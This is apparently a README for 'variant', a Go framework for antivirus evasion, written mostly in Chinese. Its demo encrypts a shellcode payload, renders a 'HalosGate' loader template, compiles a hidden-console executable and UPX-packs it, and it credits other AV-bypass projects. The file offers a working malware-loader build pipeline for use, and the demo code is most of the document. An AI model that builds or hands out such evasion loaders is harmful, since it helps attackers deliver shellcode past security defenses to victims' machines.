# variant

Go Anti-Virus Module Framework

## Description

本项目会不断添加各种免杀的技术，但是**不适合直接不做任何修改的编译和使用**，即使是有随机特征的编译

### 特别说明

1. 本项目不会有 `GUI` 版本
2. 学习Go免杀的代码集合，顺手做了模块化处理，**实际开发未结束，还在持续更新**；
3. 想要实现最好的免杀效果还需要自行修改渲染编译模板，代码提供了三种加载方式的渲染模板。

### 更新日志

1. 模块化配置
2. 编译功能更新
3. 渲染功能更新
4. 压缩功能更新

## Demo

```go
package main

import (
	"fmt"
	"path/filepath"
	"strings"
	"variant/build"
	"variant/crypto"
	"variant/enc"
	"variant/log"
	"variant/rand"
	"variant/render"
)

func main() {
	// 定义模板渲染数据
	data := render.Data{
		KeyName:    rand.RStrings(),
		KeyValue:   rand.LStrings(16),
		IvName:     rand.RStrings(),
		IvValue:    rand.LStrings(16),
		CipherText: rand.RStrings(),
		PlainText:  rand.RStrings(),
		Decrypt:    "XorAesHexBase85Decrypt",
		Loader:     "HalosGate",
	}

	// 设置加密参数
	params := enc.Payload{
		PlainText: "render/templates/payload.bin",
		Key:       []byte(data.KeyValue),
		IV:        []byte(data.IvValue),
	}
	// 加密之后的 shellcode
	tmp, err := params.SignSetKeyIV(crypto.XorAesHexBase85Encrypt)
	if err != nil {
		log.Fatal(err)
	}
	data.Payload = tmp

	// 设置模板的渲染参数
	tOpts := render.TmplOpts{
		TmplFile:     "render/templates/base.tmpl",
		OutputDir:    "output",
		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
		Data:         data,
	}
	// 生成模板
	err = render.TmplRender(tOpts)
	if err != nil {
		log.Fatal(err)
	}

	// 编译参数
	cOpts := build.CompileOpts{
		GoFileName:  tOpts.OutputGoName,
		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
		HideConsole: true,
		CompilePath: "output",
	}
	// 编译
	if err = cOpts.Compile(); err != nil {
		log.Fatal(err)
	}

	// 压缩参数
	upx := build.UpxOpts{
		Level:  "-9",
		Keep:   true,
		Force:  true,
		SrcExe: filepath.Join("output", cOpts.ExeFileName),
	}
	// 压缩
	err = upx.UpxPacker()
	if err != nil {
		log.Warn(err)
	}
}

```

### Thanks

https://github.com/Ne0nd0g/go-shellcode

https://github.com/safe6Sec/GolangBypassAV

https://github.com/afwu/GoBypass

https://github.com/piiperxyz/AniYa

https://github.com/wumansgy/goEncrypt

https://github.com/TideSec/GoBypassAV

https://github.com/Pizz33/GobypassAV-shellcode

https://github.com/timwhitez/Doge-Gabh
